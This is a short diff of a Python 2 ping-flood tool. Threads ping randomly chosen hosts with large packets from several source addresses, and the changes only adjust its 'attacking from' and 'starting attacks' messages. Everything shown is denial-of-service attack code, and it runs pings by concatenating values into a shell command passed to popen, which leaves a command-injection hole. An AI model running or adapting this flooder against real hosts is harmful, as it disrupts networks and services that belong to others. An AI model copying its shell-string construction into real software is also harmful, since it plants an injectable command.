@@ -38,14 +38,16 @@ class PingClient(threading.Thread):
         self.target = target
 
     def run(self):
+    	print "attacking from "+self.ipaddr
         ping = "ping -s 1000 -c "+self.attempts+" -I "+self.ipaddr+" "+self.target
-        print popen(ping)
+        popen(ping)
+        
 
 
 
 def pingFlood(numberOfAttackers,attempts):
     setUp()
-    print "starting "+numberOfAttackers+" attacks."
+    #print "starting "+numberOfAttackers+" attacks."
     for attacker in range(1,int(numberOfAttackers)):
     	target = hosts[randrange(len(hosts))]
         attack = PingClient(attacker,attempts,target)
